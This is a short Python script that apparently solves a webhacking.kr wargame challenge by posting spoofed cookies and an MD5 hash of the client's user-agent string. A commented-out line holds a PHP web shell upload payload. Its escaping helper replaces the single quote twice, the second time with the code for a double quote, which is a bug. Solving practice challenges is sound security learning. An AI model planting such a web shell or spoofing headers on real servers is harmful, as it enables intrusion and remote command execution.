import requests
import hashlib
import time
import random

def htmlspecialchars(text):
    return (
        text.replace("&", "&amp;").
        replace('\'', "&#039;").
        replace('\'', "&#034;").
        replace("<", "&lt;").
        replace(">", "&gt;")
    )


URL = "https://webhacking.kr/challenge/bonus-4/"
SESSION_ID = "123"
cookies = {'PHPSESSID':SESSION_ID, 'REMOTE_ADDR':"17.27.70.12.00.12.00.12.1",'HTTP_USER_AGENT':"" }

data = { "kk": hashlib.md5("python-requests/2.31.0".encode()).hexdigest() }
params ={}
# answer=""
# for i in range(97,123,2):
#     answer +=chr(i)
# print(answer)
# params = {"ans":answer}
# files = {'file':('bla.php','<?php echo system($_GET[\'cmd\']) ?>')}

response = requests.post(URL,params=params,data=data, cookies=cookies)
print(response.text)

    